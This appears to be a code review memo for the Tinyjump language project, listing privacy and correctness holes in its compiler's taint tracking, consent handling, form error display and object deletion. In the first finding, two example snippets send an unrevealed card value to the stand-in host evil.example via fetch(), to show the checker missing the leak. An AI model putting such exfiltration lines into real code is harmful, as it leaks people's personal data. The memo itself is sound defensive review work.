# Review of changes since `critic-reply-029` (PRs #36-#41, Round 2, and `builder-024` to `027`)

- **From:** critic
- **To:** owner, builder
- **Date:** 2026-11-21
- **Commits reviewed:** `6d0ccce`..`4ae3559` (PRs #36-#41, `m1-round2` `2a780fc`, `notes-next-steps`)
- **In reply to:** `builder-024-field-read-rules.md`, `builder-025-deleting-objects.md`, `builder-026-forms.md`, `builder-027-next-steps.md`
- **Status:** open; 4 real holes to fix before Round 3 (`H1` to `H4`), 1 mobile host gap before `B19` sign-off (`H5`), all scale/minor deferrals agreed

PRs #38-#41 directly remove the ~150 lines of Round 2 boilerplate (`@by` filtering, per-field `@read` with `"self"`, `this.delete()`, and `Form`/`FormInput`), and Android/iOS SSE `Sync` handles `"state": null` cleanly (`JSONObject.NULL` / `NSNull`). Before launching Round 3, four real correctness/privacy holes (`H1` to `H4`) need small fixes; one mobile host gap (`H5`) is needed before Step 5 (`B19`); everything on `builder-027`'s deferred list can wait.

---

## Real holes to fix before Round 3

### H1 (High): `flow.rs` excludes `tj:ui`, so `Form` launders `@pii` taint, `jsx` skips component bodies, and `Notice` fails `--compliance`

- **Where:** `crates/tj-core/src/flow.rs:268-275, 726-739, 882-890` and `crates/tj-core/src/modules.rs:20-26`.
- **Evidence:** `flow.rs:268-275` treats every `name.starts_with("tj:")` module as an external host plugin (`c.plugin_fns`) and excludes its `Item::Object` declarations from `c.classes`. Because `tj:ui` and `tj:consent` are pure Tinyjump code with no host boundary, three bugs appear:
  1. **`Form` launders unrevealed `@pii`:** `Form` (`plugins/ui/plugin.tj:23`) is missing from `c.classes`. Writing `const f = Form.get("x"); f.set("c", this.card); await fetch("https://evil.example/?c=" + f.value("c", ""))` compiles with **zero errors** and records **zero transfers**, sending unrevealed `@pii` over the network.
  2. **JSX does not follow component functions:** `jsx` (`flow.rs:726-739`) evaluates attribute expressions and drops their taint without calling `self.functions.get(&el.tag)`. A component `function Leak(p: { c: string }) { fetch("https://evil.example/" + p.c); return <Text/> }` rendered as `<Leak c={me.card} />` passes with zero errors.
  3. **`tj:ui` functions count as third-party transfers:** Calling `Notice({ text: reveal(this.email, "account") })` as a function records `Destination::Plugin("tj:ui")` (`flow.rs:889`), failing `tj check --compliance gdpr-eu.sample.json`.
- **Case for:** Only treat host-effect plugins (`tj:ai`, `tj:agent`, `tj:privacy`) as `plugin_fns`, include `tj:ui` and `tj:consent` in `user`, and in `jsx` pass the attributes' union taint into `self.functions.get(&el.tag)` when `el.tag` names a function. (`FormInput` with `saved={me.name}` stays clean because `Self::root` ignores the index `name` in `this.drafts[name] = { v }`.)
- **Case against / cost:** ~15 lines in `flow.rs` (`check` feature only; 0 bytes on WASM, Android, and iOS).

### H2 (High): Per-field `@read` on `@pii` bypasses withdrawn consent, allows ownerless `@pii` on shared objects, and is omitted from `--record`

- **Where:** `crates/tj-core/src/compile.rs:395-407, 510-517`, `crates/tj-core/src/flow.rs`, `crates/tj-cli/src/privacy.rs:67-75`.
- **Evidence:**
  1. **Consent withdrawal bypass:** When `const lawfulBasis = { marketing: "consent" }`, declaring `@pii("contact", "marketing") @read("owner", "staff") email: string = ""` serves and streams `email` unmasked to `staff` **even after the person withdraws consent**, because `@needs("consent:...")` only guards method calls and `reveal()`, never `Input::Get` or SSE streams.
  2. **Per-person `@pii` on non-owner objects:** `@server @read("staff") object Slot { @pii("contact", "booking") @read("staff") phone: string = "" }` compiles cleanly (`p.by` is `None`, `"owner"` is absent). `belongs_to_a_person()` (`vm/program.rs:317`) returns `true`, so `export_subject("user:ana")` and `erase_subject("user:ana")` check only `Slot/user:ana` and **never export or erase `Slot/s1.phone`**. On `Customer/user:ana`, `@pii(...) @read("staff")` without `"owner"` also masks the person's own field from themselves.
  3. **GDPR Art. 30 `--record` blind spot (`crates/tj-cli/src/privacy.rs:67-75`):** When `@pii` is shared with `"staff"` via field `@read("owner", "staff")` instead of `reveal`, `tj check --privacy --record` prints `Where it is let out: - Nowhere.`
- **Case for:**
  - On a `@pii` field without `@by`, require `"owner"` in both the object's `@read` and the field's `@read`.
  - Refuse non-`"owner"` readers in a `@pii` field's `@read` when any of its purposes rests on `"consent"` in `lawfulBasis` (hinting to use `reveal` inside a `@needs("consent:...")` method).
  - List non-`"owner"` `@pii` field `@read` roles (and `@by` object `@read` roles) in `crates/tj-cli/src/privacy.rs:67-75`.
- **Case against / cost:** ~20 lines across `compile.rs`, `flow.rs`, and `tj-cli/src/privacy.rs` (0 bytes on devices, all behind `check` / CLI).

### H3 (High): Sign-out during `Form.submit` leaks the previous user's id onto screen, and `Form` + `spec.md` `B2` drop or misplace field errors

- **Where:** `crates/tj-core/src/runtime/calls.rs:213-225`, `plugins/ui/plugin.tj:56-63`, and `m1-booking` `spec.md` `B2`.
- **Evidence:**
  1. **Shared-device leak on sign-out (`calls.rs:213-225`):** When Ana submits a form while offline or during a slow check and then signs out (or Bob signs in), `set_identity` runs `self.clear_device_objects()` **first** (line 214, wiping `Form/profile`), and **then** loops `for p in dropped` (lines 218-224), resuming Ana's suspended `Form.submit` fiber with `Err("Customer/user:ana.save was queued by another user and was not sent")`. `Form.submit`'s `catch (e)` (`plugin.tj:60`) wakes up, writes that message (including **`user:ana`'s raw id**) into `Form/profile.error`, re-saves `Form/profile` to `localStorage`, and shows it in red to Bob.
  2. **Swallowed `check` errors and Round 3 `B2` trap (`plugin.tj:57-61`):**
     - If an action inside `bookForm.submit(...)` calls `check(me.name !== "", "profile", "Save your profile first")` on a form that has **no** `<FormInput name="profile">` (only `<Notice id="book-error" text={bookForm.error} />`), `submit` writes `this.errors["profile"]`, leaves `this.error === ""`, and **nothing appears anywhere on screen**.
     - In `spec.md` `B2` (*"shows the reason in `publish-error`"*), a Round 3 blind builder following `docs/language.md:134-137, 440-449` (`validSlot` throwing `field: "title"` inside `f.submit(...)` with `<FormInput name="title" id="new-title" />` and `<Notice id="publish-error" text={f.error} />`) gets the error at `new-title-error` while `publish-error` stays empty and unrendered. A blind reviewer checking `publish-error` will score `B2: 0/5` (Must failure).
- **Case for:**
  1. In `calls.rs:213-225`, run `if someone_left { self.clear_device_objects(); }` **after** `for p in dropped` (so `Form.submit` still clears `formsSending`, and `clear_device_objects` then wipes any error written by `catch` and deletes the stored record), and use class-only (`p.object.split('/').next()`) in `why` so post-restart `Output::Error` never names `user:ana`.
  2. Track each form's bound input names in memory in `plugins/ui/plugin.tj` (next to `formsSending`, e.g. recorded in `FormInput` / `value`) so `submit` puts `e.message` in `this.errors[e.field]` only when that form actually has `e.field`, and otherwise in `this.error`. Also update `spec.md` `B2` to accept either `publish-error` or the offending field's `<id>-error` (`new-title-error`, `new-start-error`, `new-minutes-error`).
- **Case against / cost:** Moving 3 lines in `calls.rs`, ~6 lines in `plugins/ui/plugin.tj` (~200 bytes), and 1 line in `spec.md`.

### H4 (Medium-High): Three deletion edge cases in `objects.rs` and `privacy.rs`

- **Where:** `crates/tj-core/src/runtime/objects.rs:305, 320-327, 734` and `crates/tj-core/src/runtime/privacy.rs:473`.
- **Evidence:**
  1. **Deleting or erasing a live object whose fields already match defaults never emits `state: null` (`objects.rs:734`):** If `Note/user:ana` wrote `"hi"` (`seq = 1`, `created = 100`), later set `text = ""` (`seq = 2`, `created = 100`, still alive in `Note.all()`), and then called `this.delete()` (or `erase_subject`), `state_text` (`{"text":""}`) already equals `inst.state_text`. `state_changed` on line 734 is `false`, so `flush()` never increments `seq` and never emits `Output::Changed { state: Json::Null }`. Replicas keep `Note/user:ana` in `Note.all()` forever. Fix: `let state_changed = state_text != inst.state_text || gone;` (a repeat `delete()` on an already-deleted object still hits `if text == inst.saved { continue; }` at line 738).
  2. **Unloaded retention/erasure emits `Json::Object(defaults)` instead of `Json::Null` (`privacy.rs:473`):** `write_blank` sends `state: Json::Object(state)` rather than `Json::Null`, leaving unloaded expired objects alive (`gone == false`) in device `Class.all()` and device storage. Fix: `state: Json::Null` on `privacy.rs:473`.
  3. **Custom web stores without `remove` error on `sync(Null)` (`objects.rs:326`), and unseen tombstones allocate `Instance`s (`objects.rs:305`):** On a custom web store without `remove` (`hosts/web/tinyjump.js:103` returns `1`), `return self.store.remove(key)` returns `Err`, raising a red `Output::Error` banner instead of saving the blank like `clear_device_objects` (`objects.rs:245-247`) does. Also, if `!self.is_loaded(key)` when `state.is_null()` arrives from a `Slot/*` catch-up stream, returning after `let _ = self.store.remove(key)` avoids instantiating historical tombstones the device never held.
- **Case against / cost:** ~8 lines across `objects.rs` and `privacy.rs`; ~0 KB size impact.

---

## Needed before Step 5 (`B19` Android and iOS sign-off), not blocking Round 3

### H5 (Medium): Android `TinyJump.java` and iOS `TinyJump.swift` never send `roles` in `Input::Identity`

- **Where:** `hosts/android/tinyjump/src/main/java/com/mindmakr/tinyjump/TinyJump.java:102-111`, `Sync.java:77-90`, `hosts/ios/Sources/TinyJump/TinyJump.swift:48-52`, `Sync.swift:109-123`.
- **Evidence:** Web (`hosts/web/tinyjump.js:258-269`) passes `roles` in `setToken(token, user, roles)` and queries `/api/whoami`. Android and iOS only accept `(token, userId)` and send `{"type":"identity","user":...}` with no `"roles"`, so `caller.roles` in UI code is always `[]` on both mobile hosts and staff UI (`caller.roles.includes("staff")`) cannot render during Step 5's `B19` sign-off.
- **Case for:** Can wait until Step 5 (`B19`), after Round 3; add `roles` (or `/api/whoami` lookup matching `tinyjump.js`) to Android and iOS then.

---

## Answers to open questions and Round 3 doc check

1. **`builder-024` Q1 (`"self"` erasure leaving a slot `booked` with `customer == ""`, plus `Customer.get("")` guard):** Worth **one sentence** in `docs/language.md:185-191`. Show `this.customer !== ""` as the single source of truth for whether a slot is booked (so erasing the customer reopens the slot automatically without a separate `status` field), and show `s.customer !== "" ? Customer.get(s.customer) : null` so Round 3 builders do not call `Customer.get("")` on unbooked/hidden slots (which throws `invalid object id ""` during render).
2. **`builder-024` Q2 (`take_named` scan), `builder-025` Q1 (90-day tombstone compaction), `builder-026` (carrying `check`'s `field` from server refusals), and `builder-027`'s deferred list:** **Conceded / agreed to defer all of them.** None is a correctness or privacy hole at Milestone 1 scale, and keeping them out protects WASM/Android size budgets (`wasm` is 776/780 KB).
3. **`builder-027` order of next steps:** Agreed: decide on `H1`-`H4` with the owner -> Round 3 blind build + two blind reviews -> owner reviews Round 3 -> time-based state only if Round 3 shows it still hurts -> `H5` + `B19` Android/iOS/Linux sign-off -> living-app steps.
